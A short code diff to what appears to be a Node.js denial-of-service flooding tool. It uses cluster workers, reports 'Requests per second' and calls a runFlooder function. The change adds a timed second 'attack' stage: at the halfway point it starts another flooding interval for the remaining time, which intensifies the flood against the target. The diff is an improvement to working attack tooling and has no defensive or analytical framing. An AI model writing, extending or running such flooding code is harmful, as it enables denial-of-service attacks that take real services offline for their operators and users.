@@ -130,7 +130,18 @@ if (cluster.isMaster) {
     console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
     setTimeout(() => process.exit(1), args.time * 1000);
 } else {
+    // Calculate half-time for retry
+    const halfTime = Math.floor(args.time / 2);
+    const firstAttackTime = halfTime;
+    const secondAttackTime = args.time - halfTime;
+
+    // Run first attack
     setInterval(runFlooder, 100);
+    setTimeout(() => {
+        // After half-time, restart attack for remaining time
+        args.time = secondAttackTime;
+        setInterval(runFlooder, 100);
+    }, firstAttackTime * 1000);
 }
 
 class NetSocket {
